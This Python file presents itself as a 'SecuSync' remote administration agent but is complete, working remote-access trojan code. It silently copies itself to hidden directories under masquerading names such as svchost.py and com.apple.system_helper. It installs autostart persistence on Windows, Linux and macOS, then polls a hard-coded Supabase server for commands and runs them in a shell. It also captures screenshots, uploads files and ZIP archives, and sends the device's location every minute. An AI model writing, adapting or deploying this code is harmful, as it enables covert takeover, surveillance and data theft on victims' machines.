
#!/usr/bin/env python3
"""
SecuSync Remote Administrator - Python Agent
Provides full system access capabilities for remote management
"""

import os
import sys
import socket
import platform
import json
import uuid
import time
import subprocess
import base64
import shutil
import psutil
import requests
import zipfile
import io
from datetime import datetime
import threading
import glob
import tempfile
from pathlib import Path

# Configuration
AGENT_VERSION = "1.3.0"
SUPABASE_URL = "https://rrxwietrbssdnzubyaha.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJyeHdpZXRyYnNzZG56dWJ5YWhhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY2MzM0NDYsImV4cCI6MjA2MjIwOTQ0Nn0.i3wkltYBD7Y_lpQ_NodpMea7bAb92g9lPYlIXdwhuYo"
HEARTBEAT_INTERVAL = 15  # seconds
COMMAND_POLL_INTERVAL = 2  # seconds
LOCATION_UPDATE_INTERVAL = 60  # seconds
agent_id = str(uuid.uuid4())
is_running = True

# Installation paths for persistence
if platform.system() == "Windows":
    INSTALL_DIR = os.path.join(os.environ.get('LOCALAPPDATA'), "Microsoft", "Windows", "SystemApps", ".system")
    EXECUTABLE_PATH = os.path.join(INSTALL_DIR, "svchost.py")
    STARTUP_SCRIPT = os.path.join(os.environ.get('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "system_helper.pyw")
elif platform.system() == "Linux":
    INSTALL_DIR = os.path.join(os.path.expanduser("~"), ".cache", ".system")
    EXECUTABLE_PATH = os.path.join(INSTALL_DIR, "system_helper.py")
    STARTUP_SCRIPT = os.path.join(os.path.expanduser("~"), ".config", "autostart", "system_helper.desktop")
else:  # macOS
    INSTALL_DIR = os.path.join(os.path.expanduser("~"), "Library", "Application Support", ".system")
    EXECUTABLE_PATH = os.path.join(INSTALL_DIR, "system_helper.py")
    STARTUP_SCRIPT = os.path.join(os.path.expanduser("~"), "Library", "LaunchAgents", "com.apple.system_helper.plist")

def get_system_info():
    """Collect detailed system information"""
    try:
        # CPU information
        cpu_count_physical = psutil.cpu_count(logical=False)
        cpu_count_logical = psutil.cpu_count(logical=True)
        cpu_usage = psutil.cpu_percent(interval=0.5)
        
        # Memory information
        memory = psutil.virtual_memory()
        memory_total = memory.total // (1024 * 1024)  # MB
        memory_used = memory.used // (1024 * 1024)  # MB
        memory_free = memory.available // (1024 * 1024)  # MB
        memory_percent = memory.percent
        
        # Disk information
        disk = psutil.disk_usage('/')
        disk_total = disk.total // (1024 * 1024 * 1024)  # GB
        disk_used = disk.used // (1024 * 1024 * 1024)  # GB
        disk_free = disk.free // (1024 * 1024 * 1024)  # GB
        disk_percent = disk.percent
        
        # Network information
        net_io = psutil.net_io_counters()
        net_sent = net_io.bytes_sent // (1024 * 1024)  # MB
        net_recv = net_io.bytes_recv // (1024 * 1024)  # MB
        
        try:
            ip_address = socket.gethostbyname(socket.gethostname())
        except:
            ip_address = "127.0.0.1"
            
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                              for elements in range(0, 48, 8)][::-1])
        
        # Boot time
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = str(datetime.now() - boot_time)
        
        # Process information
        process_count = len(list(psutil.process_iter()))
        
        # Persistence status
        is_persistent = check_persistence_status()
        
        # Get location information
        location = get_location_info()
        
        info = {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
            "version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "ip": ip_address,
            "mac_address": mac_address,
            "username": os.getlogin(),
            "agent_type": "python",
            "agent_version": AGENT_VERSION,
            "access_level": "full",
            "persistence": is_persistent,
            "location": location,
            "cpu": {
                "model": platform.processor(),
                "physical_cores": cpu_count_physical,
                "logical_cores": cpu_count_logical,
                "usage_percent": cpu_usage
            },
            "memory": {
                "total_mb": memory_total,
                "used_mb": memory_used,
                "free_mb": memory_free,
                "usage_percent": memory_percent
            },
            "disk": {
                "total_gb": disk_total,
                "used_gb": disk_used,
                "free_gb": disk_free,
                "usage_percent": disk_percent
            },
            "network": {
                "bytes_sent_mb": net_sent,
                "bytes_received_mb": net_recv,
                "interface": "Default"
            },
            "uptime": uptime,
            "boot_time": boot_time.strftime("%Y-%m-%d %H:%M:%S"),
            "processes": process_count
        }
        return info
    except Exception as e:
        print(f"Error collecting system info: {e}")
        return {"error": str(e)}

def get_location_info():
    """Get device location using IP-based geolocation"""
    try:
        response = requests.get('https://ipinfo.io/json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            location = {
                "ip": data.get("ip", "Unknown"),
                "city": data.get("city", "Unknown"),
                "region": data.get("region", "Unknown"),
                "country": data.get("country", "Unknown"),
                "loc": data.get("loc", "0,0"),
                "org": data.get("org", "Unknown"),
                "postal": data.get("postal", "Unknown"),
                "timezone": data.get("timezone", "Unknown"),
                "timestamp": datetime.now().isoformat()
            }
            return location
        else:
            return {
                "error": f"Failed to get location: HTTP {response.status_code}",
                "loc": "0,0",
                "timestamp": datetime.now().isoformat()
            }
    except Exception as e:
        print(f"Error getting location: {e}")
        return {
            "error": str(e),
            "loc": "0,0",
            "timestamp": datetime.now().isoformat()
        }

def update_location():
    """Update location information to server"""
    try:
        location = get_location_info()
        
        headers = {
            "apikey": SUPABASE_KEY,
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        data = {
            "location": location
        }
        
        # Use Supabase REST API to update the client record
        url = f"{SUPABASE_URL}/rest/v1/clients?id=eq.{agent_id}"
        response = requests.patch(url, headers=headers, json=data)
        
        if response.status_code not in [200, 201, 204]:
            print(f"[-] Failed to update location: {response.status_code} {response.text}")
        
        return response.status_code in [200, 201, 204]
    except Exception as e:
        print(f"[-] Error updating location: {e}")
        return False

def register_client():
    """Register this client with the Supabase backend"""
    info = get_system_info()
    try:
        headers = {
            "apikey": SUPABASE_KEY,
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        data = {
            "id": agent_id,
            "hostname": info["hostname"],
            "os": info["os"],
            "ip": info["ip"],
            "status": "online",
            "system_info": info,
            "location": info.get("location", {})
        }
        
        # Use Supabase REST API to insert the client record
        url = f"{SUPABASE_URL}/rest/v1/clients"
        response = requests.post(url, headers=headers, json=data)
        
        if response.status_code in [200, 201]:
            print(f"[+] Successfully registered with server as {agent_id}")
            return True
        else:
            print(f"[-] Failed to register with server: {response.status_code} {response.text}")
            return False
    except Exception as e:
        print(f"[-] Error registering client: {e}")
        return False

def update_heartbeat():
    """Update the last_seen timestamp and system info for this client"""
    try:
        headers = {
            "apikey": SUPABASE_KEY,
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        system_info = get_system_info()
        data = {
            "last_seen": datetime.now().isoformat(),
            "status": "online",
            "system_info": system_info,
            "location": system_info.get("location", {})
        }
        
        # Use Supabase REST API to update the client record
        url = f"{SUPABASE_URL}/rest/v1/clients?id=eq.{agent_id}"
        response = requests.patch(url, headers=headers, json=data)
        
        if response.status_code not in [200, 201, 204]:
            print(f"[-] Failed to update heartbeat: {response.status_code} {response.text}")
        return response.status_code in [200, 201, 204]
    except Exception as e:
        print(f"[-] Error updating heartbeat: {e}")
        return False

def list_directory(path):
    """List files in a directory"""
    try:
        # Normalize path
        if not path:
            if platform.system() == "Windows":
                path = "C:\\"
            else:
                path = "/"
        
        # Make sure path exists and is a directory
        if not os.path.exists(path):
            return {"error": f"Path does not exist: {path}"}
        
        if not os.path.isdir(path):
            return {"error": f"Path is not a directory: {path}"}
        
        # List items in the directory
        items = []
        parent_path = os.path.dirname(path) if path != "/" else "/"
        
        try:
            for item in os.listdir(path):
                try:
                    full_path = os.path.join(path, item)
                    is_dir = os.path.isdir(full_path)
                    
                    # Get size and modified time
                    try:
                        if is_dir:
                            size = 0  # Don't calculate directory size for performance
                        else:
                            size = os.path.getsize(full_path)
                        modified = datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat()
                    except:
                        size = 0
                        modified = ""
                    
                    # Get file extension
                    extension = os.path.splitext(item)[1][1:].lower() if not is_dir else ""
                    
                    items.append({
                        "name": item,
                        "path": full_path,
                        "is_directory": is_dir,
                        "size": size,
                        "modified": modified,
                        "extension": extension
                    })
                except Exception as e:
                    print(f"Error processing file {item}: {e}")
                    # Skip files that cause errors
                    continue
                    
            # Sort directories first, then files
            items.sort(key=lambda x: (not x["is_directory"], x["name"].lower()))
            
            return {
                "current_path": path,
                "parent_path": parent_path,
                "items": items
            }
        except PermissionError:
            return {
                "error": f"Permission denied to access directory: {path}",
                "current_path": path,
                "parent_path": parent_path,
                "items": []
            }
        
    except Exception as e:
        print(f"Error listing directory: {e}")
        return {"error": str(e)}

def take_screenshot():
    """Take screenshot of the current display"""
    try:
        # Import pyautogui here to avoid import error if not installed
        try:
            import pyautogui
        except ImportError:
            return {"error": "pyautogui is not installed"}
        
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Convert to bytes
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        
        # Encode as base64
        img_b64 = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
        
        return {
            "screenshot_data": img_b64,
            "timestamp": datetime.now().isoformat(),
            "resolution": f"{screenshot.width}x{screenshot.height}"
        }
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return {"error": str(e)}

def create_zip_archive(file_paths):
    """Create a ZIP archive of the specified files"""
    try:
        # Create a temporary file for the ZIP
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as temp_file:
            temp_path = temp_file.name
        
        # Create ZIP file in memory
        zip_buffer = io.BytesIO()
        added_files = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_path in file_paths:
                try:
                    # Handle directory
                    if os.path.isdir(file_path):
                        # Process directory
                        for root, dirs, files in os.walk(file_path):
                            try:
                                # Skip certain system directories
                                if any(x in root for x in ['.git', '.svn', '__pycache__', 'node_modules']):
                                    continue
                                
                                for file in files:
                                    try:
                                        full_path = os.path.join(root, file)
                                        # Skip files that are too large (>50MB) or can't be accessed
                                        if os.path.getsize(full_path) > 50 * 1024 * 1024:
                                            continue
                                            
                                        # Add file to ZIP
                                        arcname = os.path.relpath(full_path, os.path.dirname(file_path))
                                        zip_file.write(full_path, arcname)
                                        added_files += 1
                                    except (PermissionError, OSError):
                                        # Skip files that can't be accessed
                                        continue
                            except (PermissionError, OSError):
                                # Skip directories that can't be accessed
                                continue
                                
                    # Handle individual file
                    elif os.path.isfile(file_path):
                        # Skip files that are too large (>50MB)
                        if os.path.getsize(file_path) > 50 * 1024 * 1024:
                            continue
                            
                        # Add file to ZIP
                        zip_file.write(file_path, os.path.basename(file_path))
                        added_files += 1
                except (PermissionError, OSError):
                    # Skip files or directories that can't be accessed
                    continue
                    
        # Get the ZIP data
        zip_data = base64.b64encode(zip_buffer.getvalue()).decode('utf-8')
        
        # Create a timestamp for the ZIP name
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        return {
            "zip_data": zip_data,
            "zip_name": f"secusync_files_{timestamp}.zip",
            "zip_size": len(zip_buffer.getvalue()),
            "is_truncated": False,
            "file_count": added_files
        }
    except Exception as e:
        print(f"Error creating ZIP archive: {e}")
        return {"error": str(e)}

def check_persistence_status():
    """Check if the agent is installed with persistence"""
    try:
        # Check if the executable and startup script exist
        executable_exists = os.path.exists(EXECUTABLE_PATH)
        startup_exists = os.path.exists(STARTUP_SCRIPT)
        
        return executable_exists and startup_exists
    except Exception as e:
        print(f"Error checking persistence status: {e}")
        return False

def install_persistence():
    """Install the agent with persistence"""
    try:
        # Get the current script's path
        current_script = os.path.abspath(sys.argv[0])
        
        # Create installation directory if it doesn't exist
        os.makedirs(os.path.dirname(EXECUTABLE_PATH), exist_ok=True)
        
        # Copy the current script to the installation path
        shutil.copy2(current_script, EXECUTABLE_PATH)
        
        # Make the file hidden on Windows
        if platform.system() == "Windows":
            try:
                subprocess.run(['attrib', '+H', '+S', INSTALL_DIR], check=False)
            except Exception as e:
                print(f"Error setting file attributes: {e}")
        
        # Create startup entry based on the operating system
        if platform.system() == "Windows":
            # Create startup directory if it doesn't exist
            os.makedirs(os.path.dirname(STARTUP_SCRIPT), exist_ok=True)
            
            # Create a .pyw file (runs without console) that launches the agent
            with open(STARTUP_SCRIPT, 'w') as f:
                f.write(f'import subprocess\nimport os\n\nsubprocess.Popen(["pythonw", r"{EXECUTABLE_PATH}"], \
                        creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.PIPE, stderr=subprocess.PIPE)')
        
        elif platform.system() == "Linux":
            # Create autostart directory if it doesn't exist
            os.makedirs(os.path.dirname(STARTUP_SCRIPT), exist_ok=True)
            
            # Create a .desktop file for autostart
            with open(STARTUP_SCRIPT, 'w') as f:
                f.write(f"""[Desktop Entry]
Name=System Helper
Exec=python3 {EXECUTABLE_PATH}
Type=Application
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
            # Make it executable
            os.chmod(STARTUP_SCRIPT, 0o755)
        
        else:  # macOS
            # Create LaunchAgents directory if it doesn't exist
            os.makedirs(os.path.dirname(STARTUP_SCRIPT), exist_ok=True)
            
            # Create a .plist file for launchd
            with open(STARTUP_SCRIPT, 'w') as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system_helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{EXECUTABLE_PATH}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
""")
        
        print(f"[+] Successfully installed persistence at {EXECUTABLE_PATH}")
        return {"installed": True, "path": EXECUTABLE_PATH}
    except Exception as e:
        print(f"[-] Error installing persistence: {e}")
        return {"installed": False, "error": str(e)}

def execute_command(command_id, command_text):
    """Execute a system command and return the output"""
    try:
        print(f"[+] Executing command: {command_text}")
        
        # Special command handling
        if command_text.startswith("cd "):
            # Change directory
            dir_path = command_text[3:]
            try:
                os.chdir(dir_path)
                current_dir = os.getcwd()
                result = {
                    "output": f"Changed directory to {current_dir}", 
                    "exit_code": 0,
                    "error": ""
                }
            except Exception as e:
                result = {
                    "output": "", 
                    "exit_code": 1,
                    "error": str(e)
                }
        elif command_text.startswith("ls_directory:"):
            # Custom file listing command
            path = command_text.split(":", 1)[1]
            dir_info = list_directory(path)
            result = {
                "output": json.dumps(dir_info), 
                "exit_code": 0 if "error" not in dir_info else 1,
                "error": dir_info.get("error", "")
            }
        elif command_text == "take_screenshot":
            # Take screenshot command
            screenshot_data = take_screenshot()
            result = {
                "output": json.dumps(screenshot_data), 
                "exit_code": 0 if "error" not in screenshot_data else 1,
                "error": screenshot_data.get("error", "")
            }
        elif command_text == "get_system_info":
            # Get detailed system info
            sys_info = get_system_info()
            result = {
                "output": json.dumps(sys_info), 
                "exit_code": 0,
                "error": ""
            }
        elif command_text.startswith("download_file:"):
            # Handle file download request
            file_path = command_text.split(":", 1)[1]
            try:
                if os.path.isfile(file_path):
                    with open(file_path, "rb") as f:
                        # Limit file size for base64 encoding to 10MB
                        data = f.read(10 * 1024 * 1024)
                        file_b64 = base64.b64encode(data).decode('utf-8')
                        
                    result = {
                        "output": json.dumps({
                            "file_name": os.path.basename(file_path),
                            "file_size": os.path.getsize(file_path),
                            "file_data": file_b64,
                            "is_truncated": os.path.getsize(file_path) > 10 * 1024 * 1024
                        }),
                        "exit_code": 0,
                        "error": ""
                    }
                else:
                    result = {
                        "output": "",
                        "exit_code": 1,
                        "error": f"File not found: {file_path}"
                    }
            except Exception as e:
                result = {
                    "output": "",
                    "exit_code": 1,
                    "error": f"Error reading file: {str(e)}"
                }
        elif command_text.startswith("zip_files:"):
            # Handle zip file creation and download
            try:
                # Parse the JSON string of file paths
                file_paths_json = command_text.split(":", 1)[1]
                file_paths = json.loads(file_paths_json)
                
                # Create the zip archive
                zip_result = create_zip_archive(file_paths)
                
                if "error" in zip_result:
                    result = {
                        "output": "",
                        "exit_code": 1,
                        "error": zip_result["error"]
                    }
                else:
                    result = {
                        "output": json.dumps(zip_result),
                        "exit_code": 0,
                        "error": ""
                    }
            except Exception as e:
                result = {
                    "output": "",
                    "exit_code": 1,
                    "error": f"Error creating zip: {str(e)}"
                }
        elif command_text == "install_persistence":
            # Install persistence
            persistence_result = install_persistence()
            result = {
                "output": json.dumps(persistence_result),
                "exit_code": 0 if persistence_result.get("installed", False) else 1,
                "error": persistence_result.get("error", "")
            }
        elif command_text == "check_persistence":
            # Check persistence status
            is_persistent = check_persistence_status()
            result = {
                "output": json.dumps({"is_persistent": is_persistent}),
                "exit_code": 0,
                "error": ""
            }
        else:
            # Regular command execution
            process = subprocess.Popen(
                command_text, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            output = stdout.decode('utf-8', errors='replace')
            error = stderr.decode('utf-8', errors='replace')
            
            result = {
                "output": output,
                "error": error,
                "exit_code": process.returncode
            }
        
        # Update command record in Supabase
        headers = {
            "apikey": SUPABASE_KEY,
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        data = {
            "status": "completed",
            "output": result["output"],
            "error": result["error"],
            "exit_code": result["exit_code"],
            "executed_at": datetime.now().isoformat()
        }
        
        url = f"{SUPABASE_URL}/rest/v1/commands?id=eq.{command_id}"
        response = requests.patch(url, headers=headers, json=data)
        
        if response.status_code not in [200, 201, 204]:
            print(f"[-] Failed to update command result: {response.status_code} {response.text}")
        
        return result
    except Exception as e:
        error_msg = str(e)
        print(f"[-] Error executing command: {error_msg}")
        
        # Update command with error
        headers = {
            "apikey": SUPABASE_KEY,
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        data = {
            "status": "error",
            "error": error_msg,
            "exit_code": 1,
            "executed_at": datetime.now().isoformat()
        }
        
        url = f"{SUPABASE_URL}/rest/v1/commands?id=eq.{command_id}"
        requests.patch(url, headers=headers, json=data)
        
        return {"output": "", "error": error_msg, "exit_code": 1}

def poll_commands():
    """Poll for pending commands and execute them"""
    try:
        headers = {
            "apikey": SUPABASE_KEY,
            "Content-Type": "application/json"
        }
        
        url = f"{SUPABASE_URL}/rest/v1/commands?client_id=eq.{agent_id}&status=eq.pending"
        response = requests.get(url, headers=headers)
        
        if response.status_code != 200:
            print(f"[-] Failed to poll commands: {response.status_code} {response.text}")
            return
        
        commands = response.json()
        for command in commands:
            command_id = command["id"]
            command_text = command["command"]
            threading.Thread(target=execute_command, args=(command_id, command_text)).start()
    except Exception as e:
        print(f"[-] Error polling commands: {e}")

def location_update_thread():
    """Thread to periodically update location information"""
    while is_running:
        try:
            update_location()
            time.sleep(LOCATION_UPDATE_INTERVAL)
        except Exception as e:
            print(f"[-] Location update error: {e}")
            time.sleep(LOCATION_UPDATE_INTERVAL)

def heartbeat_thread():
    """Send periodic heartbeats to the server"""
    while is_running:
        try:
            update_heartbeat()
            time.sleep(HEARTBEAT_INTERVAL)
        except Exception as e:
            print(f"[-] Heartbeat error: {e}")
            time.sleep(HEARTBEAT_INTERVAL)

def command_polling_thread():
    """Poll for commands periodically"""
    while is_running:
        try:
            poll_commands()
            time.sleep(COMMAND_POLL_INTERVAL)
        except Exception as e:
            print(f"[-] Command polling error: {e}")
            time.sleep(COMMAND_POLL_INTERVAL)

def check_and_install_persistence():
    """Check if persistence is already installed, and if not, install it"""
    if not check_persistence_status():
        print("[*] Persistence not detected, installing...")
        install_persistence()
    else:
        print("[+] Persistence already installed")

def main():
    """Main function to run the agent"""
    global is_running
    
    print("[+] Starting SecuSync Remote Agent")
    print("[+] Agent provides FULL SYSTEM ACCESS to authorized administrators")
    
    # Check for required packages and try to install if missing
    required_packages = ['psutil', 'requests']
    try:
        import pyautogui
    except ImportError:
        required_packages.append('pyautogui')
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"[!] Required package {package} is missing. Attempting to install...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"[+] Successfully installed {package}")
            except Exception as e:
                print(f"[-] Failed to install {package}: {e}")
                print(f"[-] Functionality requiring {package} will be limited")
    
    # Register with the server
    if not register_client():
        print("[-] Failed to register with server. Exiting.")
        return
    
    # Install persistence
    check_and_install_persistence()
    
    # Start heartbeat thread
    hb_thread = threading.Thread(target=heartbeat_thread)
    hb_thread.daemon = True
    hb_thread.start()
    
    # Start command polling thread
    cmd_thread = threading.Thread(target=command_polling_thread)
    cmd_thread.daemon = True
    cmd_thread.start()
    
    # Start location update thread
    loc_thread = threading.Thread(target=location_update_thread)
    loc_thread.daemon = True
    loc_thread.start()
    
    print("[+] Agent running successfully")
    print("[+] Client ID: " + agent_id)
    print("[+] Waiting for commands...")
    
    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Shutting down agent...")
        is_running = False
        time.sleep(2)  # Give threads time to clean up
        print("[+] Agent shutdown complete")

if __name__ == "__main__":
    main()